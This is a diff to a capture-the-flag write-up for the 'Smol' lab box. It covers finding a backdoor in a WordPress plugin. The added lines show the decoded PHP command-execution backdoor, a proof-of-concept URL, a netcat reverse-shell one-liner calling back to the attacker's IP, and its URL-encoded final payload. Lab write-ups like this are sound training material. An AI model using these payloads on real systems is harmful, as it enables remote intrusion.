@@ -1,5 +1,5 @@
 # Write-up: **Smol**
-Smol is a medium-ranked CTF box that introduces us to vulnerable Wordpress plugins, highlighting the need for webmasters to keep dependencies up-to-date and to consider source and reputation of external packages. The vulnerable webpage allows the execution of malicious code, which gives the opportunity to gain a foothold on the system. Ultimately, root access is obtained through a combination of misconfigurations and poorly managed passwords.
+[Smol](https://tryhackme.com/r/room/smol) is a medium-ranked CTF box that introduces us to vulnerable Wordpress plugins, highlighting the need for webmasters to keep dependencies up-to-date and to consider source and reputation of external packages. The vulnerable webpage allows the execution of malicious code, which gives the opportunity to gain a foothold on the system. Ultimately, root access is obtained through a combination of misconfigurations and poorly managed passwords.
 
 ## Reconaissance
 As usual, our first step is to scan the victim's machine for open ports and identify services that are being offered. Using `nmap`, we scan the 1000 most popular ports.
@@ -70,6 +70,26 @@ echo CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDN
 
 > if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
 
-Interpreting the combination of octal and hexadecimal literals in the strings, we see that the existence of the GET parameter `cmd` is checked and if it exists, its value is being executed. We found ourselves a RCE!
+Interpreting the combination of octal and hexadecimal literals in the strings, we see that the existence of the GET parameter `cmd` is checked; if it exists, its value is being executed. We found ourselves a RCE!
 
+Trying to invoke the backdoor by directly calling the `hello.php` script leads to an internal server error, which requires us to specify the `cmd` parameter on any other page that includes the "Hello Dolly" plugin functionality. This is for example the case on our profile page. Let's try a simple PoC.
 
+```
+http://www.smol.thm/wp-admin/profile.php?cmd=id
+```
+
+![Proof of concept for the remote code execution](img/Smol-RCE-PoC.png)
+
+The following command allows us to establish a reverse shell. Of course, we have to listen on port 4444.
+
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {Your IP} 4444 > /tmp/f
+```
+
+We URL encode it and append it to the blog's url, which gives us the final payload.
+
+```
+http://www.smol.thm/wp-admin/profile.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{Your IP}%204444%20%3E%2Ftmp%2Ff
+```
+
+## Privilege Escalation
